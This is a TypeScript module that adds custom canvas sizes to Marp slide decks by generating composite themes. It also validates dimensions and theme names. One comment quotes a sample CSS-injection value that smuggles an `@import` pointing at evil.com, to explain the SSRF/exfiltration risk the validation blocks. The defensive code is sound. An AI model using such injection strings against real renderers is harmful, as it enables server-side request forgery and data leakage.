// Bridge Marp's `size:` directive with canvas dimensions outside the
// default theme's preset list. Marp 4.x's built-in `default` / `gaia`
// / `uncover` themes only honour `size: 16:9` and `size: 4:3` — any
// other value (numeric `1080x1920`, an aspect like `9:16` or
// `16:10`, etc.) is silently dropped, leaving the slide canvas at
// 1280×720 even though the user clearly wanted something else.
//
// We work around it by parsing the frontmatter ourselves, dynamically
// registering a one-off composite theme (`@import "<userTheme>"; section
// { width: Wpx; height: Hpx; }`) on the Marp instance, then rewriting
// the frontmatter to point at the generated theme and drop the
// unrecognised `size:` directive. The user keeps writing the natural
// `size: 9:16` / `size: 1080x1920` shape; everything downstream
// (preview iframe sizing, PDF page dimensions) reads the new viewBox
// and Just Works.

import { dump as yamlDump } from "js-yaml";
import { parseFrontmatter } from "./frontmatter";

interface MarpThemeSet {
  add: (css: string) => void;
}

interface MarpLike {
  themeSet: MarpThemeSet;
}

// Sensible canvas defaults for the aspect-ratio shorthand. Picked at
// 1080-line resolution so portrait/wide decks stay print-quality.
const ASPECT_PRESETS: Record<string, [number, number]> = {
  "9:16": [1080, 1920],
  "16:10": [1280, 800],
  "1:1": [1080, 1080],
};

// Require ≥3 digits to reject implausibly small canvases (e.g.
// `0x0`, `10x10`) that would render unreadable slides.
const NUMERIC_SIZE_RE = /^(\d{3,5})[xX](\d{3,5})$/;

// Hard caps on the canvas dimensions we'll accept from the
// frontmatter. Above these, a hostile / typo'd `size: 99999x99999`
// would let marp-core emit a 99999×99999 SVG which then balloons
// the preview iframe's pixel height (slideCount × ~100000) and
// causes Chromium to OOM during PDF rendering. 3840 is "4K width",
// which is well past anything an LLM-generated deck would
// legitimately want.
const MIN_CANVAS_PX = 200;
const MAX_CANVAS_PX = 3840;

// `meta.theme` arrives from frontmatter (user-controlled) and is
// interpolated into the generated theme's `@import "<userTheme>"`
// directive. Without validation, a value like
//   theme: "default"; @import "https://evil.com/css"; /*
// would inject extra `@import` directives, and on the server PDF
// path (no CSP) Puppeteer would dutifully fetch the external CSS
// during render — an exfiltration / SSRF vector. Restrict to plain
// theme-name characters; anything else falls back to "default".
const SAFE_THEME_NAME_RE = /^[A-Za-z0-9_-]+$/;

interface CustomDimensions {
  width: number;
  height: number;
}

function inBounds(dim: number): boolean {
  return Number.isFinite(dim) && dim >= MIN_CANVAS_PX && dim <= MAX_CANVAS_PX;
}

function parseCustomSize(value: string): CustomDimensions | null {
  const preset = ASPECT_PRESETS[value];
  if (preset) return { width: preset[0], height: preset[1] };
  const match = NUMERIC_SIZE_RE.exec(value);
  if (!match) return null;
  const width = Number(match[1]);
  const height = Number(match[2]);
  // Reject hostile / typo'd values past the canvas cap. Returning
  // null falls through to Marp's own parser (which silently ignores
  // unknown sizes), so the deck still renders at the default 1280×720
  // instead of crashing Puppeteer.
  if (!inBounds(width) || !inBounds(height)) return null;
  return { width, height };
}

function serializeMarkdown(meta: Record<string, unknown>, body: string): string {
  const yamlText = yamlDump(meta, { lineWidth: -1, sortKeys: false }).trimEnd();
  return `---\n${yamlText}\n---\n${body}`;
}

/**
 * Intercept Marp's `size:` directive for values the built-in themes
 * don't understand. When a custom size is detected, registers a
 * composite theme on the Marp instance and returns markdown rewritten
 * to use it. Pass-through for standard `16:9` / `4:3` (Marp handles
 * them natively) and for documents that don't declare a size.
 */
export function applyCustomMarpSize(marp: MarpLike, markdown: string): string {
  const { meta, body, hasHeader } = parseFrontmatter(markdown);
  if (!hasHeader) return markdown;
  const sizeValue = typeof meta.size === "string" ? meta.size.trim() : "";
  if (sizeValue === "" || sizeValue === "16:9" || sizeValue === "4:3") return markdown;
  const dims = parseCustomSize(sizeValue);
  if (!dims) return markdown;

  const rawTheme = typeof meta.theme === "string" ? meta.theme.trim() : "default";
  // Drop hostile / non-identifier theme names down to "default"
  // BEFORE building the generated theme name or its `@import` —
  // otherwise quotes / `@import` tokens / CSS injection slip into
  // the registered CSS and Puppeteer would fetch them.
  const userTheme = SAFE_THEME_NAME_RE.test(rawTheme) ? rawTheme : "default";
  // Avoid recursion if a previous render already swapped in a
  // generated theme name — re-applying would compose-on-compose.
  if (userTheme.startsWith("mc_size_")) return markdown;

  const themeName = `mc_size_${userTheme}_${dims.width}x${dims.height}`;
  marp.themeSet.add(`/* @theme ${themeName} */\n@import "${userTheme}";\nsection { width: ${dims.width}px; height: ${dims.height}px; }`);

  const newMeta: Record<string, unknown> = { ...meta, theme: themeName };
  delete newMeta.size;
  return serializeMarkdown(newMeta, body);
}
